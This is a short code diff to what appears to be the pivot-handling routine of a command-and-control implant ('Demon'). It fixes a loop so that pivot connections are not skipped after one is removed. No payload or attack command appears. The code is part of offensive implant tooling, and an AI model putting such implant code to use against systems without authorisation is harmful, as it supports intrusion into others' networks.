@@ -286,7 +286,10 @@ VOID PivotPush()
                                 PackageAddInt32( Package, DemonID );
                                 PackageTransmit( Package );
 
-                                break;
+                                /* TempList already points at the next pivot. continue
+                                 * the outer loop without advancing it again, otherwise
+                                 * the pivot after the removed one is skipped this pass */
+                                goto NEXT_PIVOT;
                             }
 
                             Output = Instance->Win32.LocalAlloc( LPTR, Length );
@@ -342,7 +345,10 @@ VOID PivotPush()
                         PackageAddInt32( Package, DemonID );
                         PackageTransmit( Package );
 
-                        break;
+                        /* TempList already points at the next pivot. continue
+                         * the outer loop without advancing it again, otherwise
+                         * the pivot after the removed one is skipped this pass */
+                        goto NEXT_PIVOT;
                     }
 
                     PACKAGE_ERROR_WIN32
@@ -357,6 +363,7 @@ VOID PivotPush()
         if ( TempList )
             TempList = TempList->Next;
 
+NEXT_PIVOT: ;
     } while ( TRUE );
 }
 
